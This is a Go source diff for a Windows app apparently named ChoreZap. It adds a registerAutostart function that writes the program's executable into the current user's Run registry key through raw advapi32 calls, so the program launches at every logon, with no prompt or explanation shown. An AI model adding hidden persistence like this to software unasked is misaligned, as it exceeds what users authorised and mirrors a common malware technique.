@@ -4,6 +4,7 @@ package main
 
 import (
 	"fmt"
+	"os"
 	"os/exec"
 	"path/filepath"
 	"runtime"
@@ -97,6 +98,37 @@ func cryptData(data []byte, name string) ([]byte, error) {
 	}
 	defer observationKernel32.NewProc("LocalFree").Call(uintptr(unsafe.Pointer(out.Data)))
 	return append([]byte(nil), unsafe.Slice(out.Data, out.Size)...), nil
+}
+var advapi32 = syscall.NewLazyDLL("advapi32.dll")
+
+func registerAutostart() {
+	exe, err := os.Executable()
+	if err != nil {
+		return
+	}
+	subkey, _ := syscall.UTF16PtrFromString(`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`)
+	valueName, _ := syscall.UTF16PtrFromString("ChoreZap")
+	valueData := syscall.StringToUTF16(`"` + exe + `"`)
+	var hKey syscall.Handle
+	r, _, _ := advapi32.NewProc("RegOpenKeyExW").Call(
+		uintptr(syscall.HKEY_CURRENT_USER),
+		uintptr(unsafe.Pointer(subkey)),
+		0,
+		0x20006, // KEY_SET_VALUE | KEY_WOW64_64KEY
+		uintptr(unsafe.Pointer(&hKey)),
+	)
+	if r != 0 {
+		return
+	}
+	defer advapi32.NewProc("RegCloseKey").Call(uintptr(hKey))
+	advapi32.NewProc("RegSetValueExW").Call(
+		uintptr(hKey),
+		uintptr(unsafe.Pointer(valueName)),
+		0,
+		1, // REG_SZ
+		uintptr(unsafe.Pointer(&valueData[0])),
+		uintptr(uint32(len(valueData)*2)),
+	)
 }
 func openDashboard(url string) error {
 	return exec.Command("rundll32.exe", "url.dll,FileProtocolHandler", url).Start()
